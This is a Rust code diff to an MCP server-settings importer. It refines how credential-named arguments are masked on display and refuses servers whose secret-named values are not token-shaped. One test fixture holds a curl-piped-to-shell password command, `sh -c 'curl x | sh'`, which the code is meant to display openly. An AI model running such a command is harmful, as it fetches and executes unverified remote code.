@@ -23,15 +23,33 @@
 //!
 //! **What is shown masks more than what refuses** (since the full review
 //! of step 25's third pull request, [`ImportedServer::shown`]): a value
-//! whose name says it is a credential (`key`, `token`, `secret`,
-//! `password` or `auth` in it) is shown [`MASK`](cineris_base::redact::MASK)
-//! in `NAME=value`, after such a flag (`--api-key value`), and in an
-//! address's query (`?token=…`). Such a server is still imported, as it is
-//! in its file: a name says nothing certain of its value.
-//! [`ImportedServer::hidden`] says that what is shown hides a part of what
-//! would be imported, so that the first run can say so. **Every argument's
-//! bounds show:** one that is empty, or holds a space or a `"`, is shown in
-//! double quotes, its `"` and `\` escaped.
+//! whose name says it is a credential is shown
+//! [`MASK`](cineris_base::redact::MASK) in `NAME=value`, after such a flag
+//! (`--api-key value`), and in an address's query (`?token=…`). Such a
+//! server is still imported, as it is in its file: a name says nothing
+//! certain of its value. [`ImportedServer::hidden`] says that what is shown
+//! hides a part of what would be imported, so that the first run can say
+//! so. **Every argument's bounds show:** one that is empty, or holds a
+//! space or a `"`, is shown in double quotes, its `"` and `\` escaped.
+//!
+//! **Which names, and which values** (since the review of the fixes of the
+//! third pull request, the coordinator's decision; the substring rule
+//! before it hid `--author`'s value and a password command's whole line):
+//!
+//! - **A name says it is a credential's** when one of its words, split at
+//!   `-`, `_`, `.` and where the case changes (`apiKey`), is one of
+//!   [`SECRET_WORDS`]: `--api-key` and `GITHUB_TOKEN` do; `--author`,
+//!   `--keyboard` and `--tokenizer` do not.
+//! - **Never one that ends in** [`SHOWN_ENDINGS`] (`command`, `cmd`, `hook`,
+//!   `script`, `file`, `path`): its value says where a credential comes
+//!   from, not the credential, and is shown (`--password-command …`,
+//!   `--auth-hook=…`). Nor a switch turned off (`--no-auth`), which takes
+//!   no value.
+//! - **Only a value of a token's shape is masked and imported:** one word,
+//!   with no white space and no path separator. A value under such a name
+//!   that is not one is masked and its server refused
+//!   ([`Refusal::NamedValue`]): it would be imported unseen, and a
+//!   credential that is not a token belongs in a variable.
 //!
 //! The files read: `~/.claude.json`, Cursor's `~/.cursor/mcp.json` and
 //! Claude Desktop's file (`mcpServers`, each server a `command` with
@@ -61,14 +79,122 @@ pub const MAX_SERVERS: usize = 64;
 /// name is a key of the user's file, and names the server's tools.
 pub const MAX_NAME: usize = 64;
 
-/// The words a name holds when its value is taken for a credential, and
-/// shown masked: `GITHUB_TOKEN=…`, `--api-key …`, `?auth=…`.
-const SECRET_WORDS: [&str; 5] = ["key", "token", "secret", "password", "auth"];
+/// The words of a name whose value is taken for a credential, and shown
+/// masked, each matched as a whole word of the name: `GITHUB_TOKEN=…`,
+/// `--api-key …`, `?auth=…`.
+pub const SECRET_WORDS: &[&str] = &[
+    "key",
+    "keys",
+    "apikey",
+    "token",
+    "tokens",
+    "secret",
+    "secrets",
+    "password",
+    "passwords",
+    "passwd",
+    "pwd",
+    "auth",
+    "authorization",
+];
 
-/// Whether `name` says its value is a credential.
+/// The last words of a name whose value is never masked: it says where a
+/// credential comes from, not the credential (`--password-command`,
+/// `--auth-hook`, `--token-file`).
+pub const SHOWN_ENDINGS: &[&str] = &["command", "cmd", "hook", "script", "file", "path"];
+
+/// The words of a name, in lower case: split at `-`, `_`, `.` and where the
+/// case changes (`apiKey`, `APIKey`), each run of digits kept with the
+/// letters before it.
+fn words(name: &str) -> Vec<String> {
+    let mut words = Vec::new();
+    let mut word = String::new();
+    let characters: Vec<char> = name.chars().collect();
+    for (at, &character) in characters.iter().enumerate() {
+        if matches!(character, '-' | '_' | '.') || !character.is_alphanumeric() {
+            if !word.is_empty() {
+                words.push(std::mem::take(&mut word));
+            }
+            continue;
+        }
+        let before = at.checked_sub(1).and_then(|at| characters.get(at));
+        let after = characters.get(at + 1);
+        // `aB`, and the `B` of `ABc`: a new word begins.
+        let begins = character.is_uppercase()
+            && before.is_some_and(|before| {
+                before.is_lowercase()
+                    || before.is_ascii_digit()
+                    || (before.is_uppercase() && after.is_some_and(|after| after.is_lowercase()))
+            });
+        if begins && !word.is_empty() {
+            words.push(std::mem::take(&mut word));
+        }
+        word.extend(character.to_lowercase());
+    }
+    if !word.is_empty() {
+        words.push(word);
+    }
+    words
+}
+
+/// Whether `name` says its value is a credential: a word of it is one of
+/// [`SECRET_WORDS`], its last is not one of [`SHOWN_ENDINGS`], and it is
+/// not a switch turned off (`--no-auth`).
 fn names_a_secret(name: &str) -> bool {
-    let name = name.to_ascii_lowercase();
-    SECRET_WORDS.iter().any(|word| name.contains(word))
+    let words = words(name);
+    let Some(last) = words.last() else {
+        return false;
+    };
+    if SHOWN_ENDINGS.contains(&last.as_str()) || words.first().is_some_and(|first| first == "no") {
+        return false;
+    }
+    words
+        .iter()
+        .any(|word| SECRET_WORDS.contains(&word.as_str()))
+}
+
+/// Whether `value` has a token's shape: one word, with no white space and
+/// no path separator.
+fn token_shaped(value: &str) -> bool {
+    !value.is_empty()
+        && !value
+            .chars()
+            .any(|character| character.is_whitespace() || matches!(character, '/' | '\\'))
+}
+
+/// How a value whose name says it is a credential is shown.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Masked {
+    /// Nothing is masked.
+    No,
+    /// Masked, and imported as it is: a token.
+    Token,
+    /// Masked, and its server refused: not a token.
+    Loose,
+}
+
+impl Masked {
+    /// What `value` under a name that says it is a credential is: a token,
+    /// or not; nothing, and the mask itself (masked already by the
+    /// formats), are neither, and are shown as they are.
+    fn of(value: &str) -> Self {
+        if value.is_empty() || value == cineris_base::redact::MASK {
+            Self::No
+        } else if token_shaped(value) {
+            Self::Token
+        } else {
+            Self::Loose
+        }
+    }
+
+    /// The more of the two.
+    fn and(self, other: Self) -> Self {
+        match (self, other) {
+            (Self::Loose, _) | (_, Self::Loose) => Self::Loose,
+            (Self::Token, _) | (_, Self::Token) => Self::Token,
+            _ => Self::No,
+        }
+    }
 }
 
 /// Whether `name` can be a server's name in the user's file: one to
@@ -101,22 +227,22 @@ fn quoted(part: &str) -> String {
 }
 
 /// `url` with the value of each query field whose name says it is a
-/// credential masked, and whether one was.
-fn masked_query(url: &str) -> (String, bool) {
+/// credential masked, and what was.
+fn masked_query(url: &str) -> (String, Masked) {
     let mask = cineris_base::redact::MASK;
     let Some((base, rest)) = url.split_once('?') else {
-        return (url.to_owned(), false);
+        return (url.to_owned(), Masked::No);
     };
     let (query, fragment) = match rest.split_once('#') {
         Some((query, fragment)) => (query, Some(fragment)),
         None => (rest, None),
     };
-    let mut hidden = false;
+    let mut hidden = Masked::No;
     let fields: Vec<String> = query
         .split('&')
         .map(|field| match field.split_once('=') {
-            Some((name, value)) if names_a_secret(name) && value != mask => {
-                hidden = true;
+            Some((name, value)) if names_a_secret(name) && Masked::of(value) != Masked::No => {
+                hidden = hidden.and(Masked::of(value));
                 format!("{name}={mask}")
             }
             _ => field.to_owned(),
@@ -157,6 +283,11 @@ pub enum Refusal {
     Unseen,
     /// Its name cannot be a setting's: empty, or longer than [`MAX_NAME`].
     Name,
+    /// A value whose name says it is a credential is not a token (it holds
+    /// white space or a path separator): it would be imported unseen, and
+    /// belongs in a variable (since the review of the fixes of step 25's
+    /// third pull request).
+    NamedValue,
     /// It is neither a command nor an address this version reads.
     NotUnderstood,
 }
@@ -209,35 +340,43 @@ impl ImportedServer {
     /// screen, which the first run says.
     #[must_use]
     pub fn hidden(&self) -> bool {
-        self.view().1
+        self.view().1 != Masked::No
     }
 
-    fn view(&self) -> (String, bool) {
-        let mask = cineris_base::redact::MASK;
-        match &self.launch {
-            Launch::Command { program, args } => {
-                let mut hidden = false;
-                let mut parts = vec![quoted(program)];
-                // The value after a flag whose name says it is a credential.
-                let mut after_flag = false;
-                for arg in args {
-                    let shown = if after_flag && !arg.starts_with('-') {
-                        mask.to_owned()
-                    } else if let Some((name, _)) = arg.split_once('=')
-                        && names_a_secret(name)
-                    {
-                        format!("{name}={mask}")
-                    } else {
-                        arg.clone()
-                    };
-                    hidden |= shown != *arg;
-                    after_flag = arg.starts_with('-') && !arg.contains('=') && names_a_secret(arg);
-                    parts.push(quoted(&shown));
-                }
-                (parts.join(" "), hidden)
+    fn view(&self) -> (String, Masked) {
+        launch_view(&self.launch)
+    }
+}
+
+/// `launch` as it is shown, and what of it is masked by a name.
+fn launch_view(launch: &Launch) -> (String, Masked) {
+    let mask = cineris_base::redact::MASK;
+    match launch {
+        Launch::Command { program, args } => {
+            let mut hidden = Masked::No;
+            let mut parts = vec![quoted(program)];
+            // The value after a flag whose name says it is a credential.
+            let mut after_flag = false;
+            for arg in args {
+                let shown = if after_flag && !arg.starts_with('-') && Masked::of(arg) != Masked::No
+                {
+                    hidden = hidden.and(Masked::of(arg));
+                    mask.to_owned()
+                } else if let Some((name, value)) = arg.split_once('=')
+                    && names_a_secret(name)
+                    && Masked::of(value) != Masked::No
+                {
+                    hidden = hidden.and(Masked::of(value));
+                    format!("{name}={mask}")
+                } else {
+                    arg.clone()
+                };
+                after_flag = arg.starts_with('-') && !arg.contains('=') && names_a_secret(arg);
+                parts.push(quoted(&shown));
             }
-            Launch::Remote { url } => masked_query(url),
+            (parts.join(" "), hidden)
         }
+        Launch::Remote { url } => masked_query(url),
     }
 }
 
@@ -398,6 +537,8 @@ fn server(filter: &SecretFilter, name: &str, entry: &serde_json::Value) -> Impor
         Some(Refusal::Name)
     } else if masked {
         Some(Refusal::HoldsCredential)
+    } else if launch_view(&server.launch).1 == Masked::Loose {
+        Some(Refusal::NamedValue)
     } else {
         None
     };
@@ -550,6 +691,65 @@ mod tests {
         let plain = by_name(&servers, "plain");
         assert!(!plain.hidden());
         assert_eq!(plain.shown(), "docs-mcp --root ~/src/docs");
+    }
+
+    /// Which names hide their values (the review of the fixes of the third
+    /// pull request, the coordinator's decision): a credential's words, as
+    /// whole words of the name; never a name that ends in a command, a
+    /// hook, a script, a file or a path, nor a switch turned off. A token
+    /// under such a name is masked and imported, which `hidden` says; a
+    /// value under one that is not a token is masked and refuses its
+    /// server.
+    #[test]
+    fn only_a_token_under_a_credentials_name_is_hidden_and_any_other_value_refuses() {
+        let servers = servers_in(
+            r#"{"mcpServers": {
+                "vault": {"command": "vault-mcp", "args": ["--password-command",
+                    "sh -c 'curl x | sh'", "--auth-hook=/tmp/x.sh"]},
+                "plain": {"command": "words-mcp", "args": ["--author", "Bob", "--keyboard",
+                    "us", "--tokenizer", "x", "--no-auth", "serve"]},
+                "real": {"command": "search-mcp", "args": ["--api-key", "x7Kq9mPz2Lw4Rt8vB3nD",
+                    "--apiKey=Zt5Qw8Lm2Np6Rv"]},
+                "phrase": {"command": "db-mcp", "args": ["--password", "correct horse battery"]},
+                "pathed": {"command": "db-mcp", "args": ["--token", "/run/secrets/db"]},
+                "query": {"url": "https://x.example.com/mcp?token=a/b"}
+            }}"#,
+            false,
+        )
+        .unwrap();
+        let vault = by_name(&servers, "vault");
+        assert_eq!(
+            vault.shown(),
+            r#"vault-mcp --password-command "sh -c 'curl x | sh'" --auth-hook=/tmp/x.sh"#
+        );
+        assert!(!vault.hidden());
+        assert_eq!(vault.refused, None);
+        let plain = by_name(&servers, "plain");
+        assert_eq!(
+            plain.shown(),
+            "words-mcp --author Bob --keyboard us --tokenizer x --no-auth serve"
+        );
+        assert!(!plain.hidden());
+        assert_eq!(plain.refused, None);
+        let real = by_name(&servers, "real");
+        assert_eq!(
+            real.shown(),
+            format!("search-mcp --api-key {MASK} --apiKey={MASK}")
+        );
+        assert!(real.hidden(), "the row says a value is imported unseen");
+        assert_eq!(real.refused, None, "a token is imported as it is");
+        for name in ["phrase", "pathed", "query"] {
+            let server = by_name(&servers, name);
+            assert_eq!(server.refused, Some(Refusal::NamedValue), "{name}");
+            assert!(server.shown().contains(MASK), "{name}: {}", server.shown());
+        }
+        assert!(!by_name(&servers, "phrase").shown().contains("horse"));
+        assert!(!by_name(&servers, "pathed").shown().contains("secrets"));
+        assert_eq!(words("--api-key"), ["api", "key"]);
+        assert_eq!(words("APIKey"), ["api", "key"]);
+        assert_eq!(words("authToken"), ["auth", "token"]);
+        assert_eq!(words("GITHUB_TOKEN"), ["github", "token"]);
+        assert_eq!(words("v2Token.x"), ["v2", "token", "x"]);
     }
 
     /// Where each argument begins and ends shows: one that is empty, or
